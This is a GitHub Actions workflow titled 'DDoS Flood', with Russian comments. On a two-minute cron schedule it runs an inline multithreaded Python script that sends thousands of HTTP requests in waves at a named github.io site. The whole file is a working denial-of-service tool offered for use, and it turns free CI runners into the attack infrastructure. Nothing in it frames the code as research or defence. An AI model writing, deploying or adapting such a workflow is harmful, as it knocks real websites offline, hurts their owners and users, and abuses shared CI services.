name: DDoS Flood

on:
  schedule:
    - cron: '*/2 * * * *'
  workflow_dispatch: # Включает кнопку "Run workflow" вручную

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3
      
      - name: Install dependencies
        run: pip install requests
      
      - name: Run Attack Burst (Multithreaded)
        run: |
          python -c "
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

target = 'https://srabakio.github.io/'
threads = 50 # Увеличил количество потоков

def hit_target(_):
    try:
        return requests.get(target, timeout=5).status_code
    except Exception:
        return 0

with ThreadPoolExecutor(max_workers=threads) as executor:
    # Запускаем 100 циклов по 50 запросов каждый
    for _ in range(100):
        list(executor.map(hit_target, range(threads)))
        time.sleep(0.1) # Маленькая пауза между «волнами», чтобы не заспали совсем

print('Flood completed')
"
